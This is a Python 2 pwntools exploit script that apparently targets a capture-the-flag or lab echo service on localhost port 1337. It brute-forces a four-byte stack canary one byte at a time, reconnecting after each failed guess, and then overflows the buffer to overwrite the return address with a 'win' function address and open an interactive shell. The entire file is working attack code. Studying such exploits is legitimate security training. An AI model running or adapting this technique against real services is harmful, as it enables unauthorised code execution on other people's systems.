# exploit.py
from pwn import *
import time

padding = 'A'*20
addr_win = 0x8844

# Sends the final exploit string
def exploit(r, canary):
    print '[+] Sending final exploit to get a shell'
    r.send(padding + canary + 'AAAA' + p32(addr_win))
    print '[+] Switching to interactive mode'
    r.interactive()


# Brute force the canary byte by byte
def find_canary(r):
    canary = ''
    r.readline()

    while True:
        # Try all bytes from 0 to 255
        for i in xrange(256):
            payload = padding + canary + chr(i)
            r.send(payload)
            r.recvuntil(payload)

            try:
                r.recvuntil('Enter something to echo:\n')

            except EOFError:
                # If we guessed incorrectly, it throws an EOFError
                r.close()

                # Sleep to prevent overwhelming the system with too many forked process
                time.sleep(0.1)

                r = remote('127.0.0.1', 1337)

            else:
                # No error, guessed correctly
                canary += chr(i)
                print '[+] Canary bytes:', canary.encode('hex')
                time.sleep(1)

                # Check if guessed the complete canary
                if len(canary) == 4:
                    print '[+] Full canary found!'
                    return canary
                else:
                    break


def main():
    r = remote('127.0.0.1', 1337)
    canary = find_canary(r)
    r.close()
    r = remote('127.0.0.1', 1337)
    exploit(r, canary)


if __name__ == '__main__':
    main()